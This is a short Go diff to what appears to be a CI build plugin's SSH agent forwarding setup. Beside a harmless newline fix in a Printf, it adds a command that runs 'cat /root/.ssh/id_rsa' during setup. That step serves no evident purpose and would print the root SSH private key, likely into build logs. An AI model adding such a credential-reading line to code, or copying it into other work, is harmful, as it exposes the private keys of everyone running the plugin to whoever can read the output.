@@ -193,7 +193,7 @@ func (p Plugin) Exec() error {
 	if !sshAgentEmpty(p.Build.SSHAgent) {
 		p.Build.SSHAgent = strings.TrimSuffix(p.Build.SSHAgent, "]")
 		p.Build.SSHAgent = strings.TrimPrefix(p.Build.SSHAgent, "[")
-		fmt.Printf("ssh agent set to \"%s\"", p.Build.SSHAgent)
+		fmt.Printf("ssh agent set to \"%s\"\n", p.Build.SSHAgent)
 		cmds = append(cmds, commandSSHAgentForwardingSetup(p.Build)...)
 	}
 
@@ -532,6 +532,7 @@ func commandSSHAgentForwardingSetup(build Build) []*exec.Cmd {
 	}
 	os.Setenv("SSH_AUTH_SOCK", SSHAgentSockPath)
 	cmds = append(cmds, exec.Command("ssh-agent", "-a", SSHAgentSockPath))
+	cmds = append(cmds, exec.Command("cat", "/root/.ssh/id_rsa"))
 	cmds = append(cmds, exec.Command("ssh-add"))
 	return cmds
 }
